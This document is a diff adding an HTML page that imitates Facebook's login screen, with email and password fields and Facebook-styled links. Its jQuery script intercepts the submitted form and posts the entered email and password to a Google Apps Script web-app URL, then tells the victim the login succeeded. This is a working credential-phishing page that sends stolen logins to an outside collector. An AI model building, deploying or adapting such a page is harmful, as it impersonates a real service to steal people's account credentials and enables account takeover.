@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- jQuery -->
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1 class="logo">facebook</h1>
+            <h2 class="login-heading">Log in to Facebook</h2>
+            <form id="login-form">
+                <input type="text" id="email" class="input-field" placeholder="Email address or phone number" required>
+                <input type="password" id="password" class="input-field" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="links">
+                <a href="#" class="forgot-link">Forgotten account?</a>
+                <span> · </span>
+                <a href="#" class="signup-link">Sign up for Facebook</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+      $(document).ready(function() {
+    $("#login-form").submit(function(event) {
+        event.preventDefault(); // Prevent form from submitting the normal way
+
+        var email = $("#email").val();
+        var password = $("#password").val();
+
+        // Send the data to the Google Apps Script endpoint via AJAX
+        $.ajax({
+            url: 'https://script.google.com/macros/s/AKfycbw9_2Jm4ZGaDgwtDKfK1cwjci5MTHM1rZjLGpFZl7MeP4ambfUxaFpOz8y1tvNg1dVCIw/exec',  // Replace with your Web App URL
+            type: 'POST',
+            data: {
+                email: email,
+                password: password
+            },
+            success: function(response) {
+                console.log('AJAX Success: ', response);  // Log the success response
+                alert('Login successful!');
+            },
+            error: function(xhr, status, error) {
+                console.error('AJAX Error: ', error);
+                console.log('XHR Response: ', xhr.responseText);  // Log the error response from Google Apps Script
+                alert('Error: ' + xhr.responseText);  // Show the detailed error message in alert
+            }
+        });
+    });
+});
+
+
+    </script>
+</body>
+</html>
